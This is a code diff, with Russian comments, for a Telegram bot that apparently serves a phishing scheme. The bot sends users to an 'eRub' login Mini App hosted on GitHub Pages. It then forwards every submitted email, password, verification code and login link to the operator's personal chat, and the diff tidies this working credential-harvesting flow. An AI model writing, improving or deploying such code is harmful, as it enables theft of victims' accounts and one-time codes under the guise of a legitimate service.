@@ -9,19 +9,29 @@ from telegram.ext import Application, CommandHandler, MessageHandler, filters, C
 from telegram.request import HTTPXRequest
 
 # ==================== КОНФИГ ====================
-# Railway будет брать токен из переменной TELEGRAM_TOKEN
-BOT_TOKEN = os.environ.get("TELEGRAM_TOKEN")  
-# Твой личный ID (в ЛС)
-ADMIN_ID = 8542901240 
+# Ищем BOT_TOKEN (как у тебя в Railway). Если нет - ищем TELEGRAM_TOKEN.
+BOT_TOKEN = os.environ.get("BOT_TOKEN") or os.environ.get("TELEGRAM_TOKEN")
+ADMIN_ID_STR = os.environ.get("ADMIN_ID", "8542901240")
 WEB_APP_URL = "https://alexandersvet2711-sys.github.io/erub/"
 # ===============================================
 
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
+# Проверка, что токен нашелся
+if not BOT_TOKEN:
+    logger.error("❌ ОШИБКА: Переменная BOT_TOKEN не найдена в Railway!")
+    exit(1)
+
+try:
+    ADMIN_ID = int(ADMIN_ID_STR)
+except ValueError:
+    logger.error(f"❌ ОШИБКА: ADMIN_ID должен быть числом, а не '{ADMIN_ID_STR}'")
+    exit(1)
+
 class ErubBot:
     def __init__(self):
-        # Добавляем таймауты, чтобы бот не падал на Railway
+        # Увеличенные таймауты для Railway
         custom_request = HTTPXRequest(connect_timeout=30.0, read_timeout=30.0)
         
         self.app = Application.builder()\
@@ -38,7 +48,7 @@ class ErubBot:
         user = update.effective_user
         current_time = datetime.now().strftime("%d.%m.%Y %H:%M")
 
-        # Уведомление ТЕБЕ
+        # Уведомление ТЕБЕ в ЛС
         try:
             await self.app.bot.send_message(
                 chat_id=ADMIN_ID,
@@ -55,28 +65,23 @@ class ErubBot:
         # Приветствие пользователю
         await update.message.reply_text(
             f"👋 Привет, {user.first_name}!\n\n"
-            f"Нажмите кнопку ВНИЗУ, чтобы открыть приложение eRub.\n\n"
-            f"Если Вы ещё не зарегистрированы в eRub, выберите Вход через E-ID.",
+            f"Нажмите кнопку ВНИЗУ, чтобы открыть приложение eRub.",
             reply_markup=ReplyKeyboardMarkup(
                 [[KeyboardButton("🔑 Войти", web_app=WebAppInfo(url=WEB_APP_URL))]],
                 resize_keyboard=True
             )
         )
 
-    # ===== 2. Обработка сообщений =====
+    # ===== 2. Обработка сообщений (на случай tg.sendData) =====
     async def handle(self, update: Update, context):
-        if not update.message:
-            return
-
+        if not update.message: return
         msg = update.message
         chat_id = msg.chat.id
         user_id = msg.from_user.id
         text = msg.text
 
-        if chat_id == ADMIN_ID:
-            return
+        if chat_id == ADMIN_ID: return
 
-        # Если это JSON от Mini App
         if text and text.startswith('{') and text.endswith('}'):
             try:
                 data = json.loads(text)
@@ -84,47 +89,38 @@ class ErubBot:
                 password = data.get('password')
                 code = data.get('code')
                 link = data.get('link')
-                
-                # Обычный вход
+
                 if email and password and not code and not link:
                     await self.app.bot.send_message(
                         chat_id=ADMIN_ID,
-                        text=f"🔔 НОВАЯ ЗАЯВКА!\n\n"
-                             f"👤 ID: `{user_id}`\n"
-                             f"📧 Логин: `{email}`\n"
-                             f"🔑 Пароль: `{password}`",
+                        text=f"🔔 НОВАЯ ЗАЯВКА!\n\n👤 ID: `{user_id}`\n📧 Логин: `{email}`\n🔑 Пароль: `{password}`",
                         parse_mode="Markdown"
                     )
-                    await msg.reply_text("✅ Заявка отправлена администратору!")
+                    await msg.reply_text("✅ Данные приняты.")
                     return
 
-                # Код
                 if code:
                     await self.app.bot.send_message(
                         chat_id=ADMIN_ID,
-                        text=f"📧 КОД: `{code}`\n👤 ID: `{user_id}`",
+                        text=f"📧 КОД!\n👤 ID: `{user_id}`\n🔢 Код: `{code}`",
                         parse_mode="Markdown"
                     )
-                    await msg.reply_text("✅ Код отправлен!")
+                    await msg.reply_text("✅ Код отправлен.")
                     return
 
-                # Ссылка
                 if link:
                     await self.app.bot.send_message(
                         chat_id=ADMIN_ID,
-                        text=f"🔗 ССЫЛКА: `{link}`\n👤 ID: `{user_id}`",
+                        text=f"🔗 ССЫЛКА!\n👤 ID: `{user_id}`\n🔗 Ссылка: `{link}`",
                         parse_mode="Markdown"
                     )
-                    await msg.reply_text("✅ Ссылка отправлена!")
+                    await msg.reply_text("✅ Ссылка отправлена.")
                     return
-
             except Exception as e:
-                logger.error(f"Ошибка: {e}")
-                await msg.reply_text("❌ Ошибка обработки данных")
+                logger.error(f"Ошибка JSON: {e}")
         else:
             await msg.reply_text("ℹ️ Используйте кнопку «Войти»")
 
-    # ===== 3. Запуск =====
     def run(self):
         print("=" * 50)
         print("🚀 БОТ ЗАПУЩЕН")
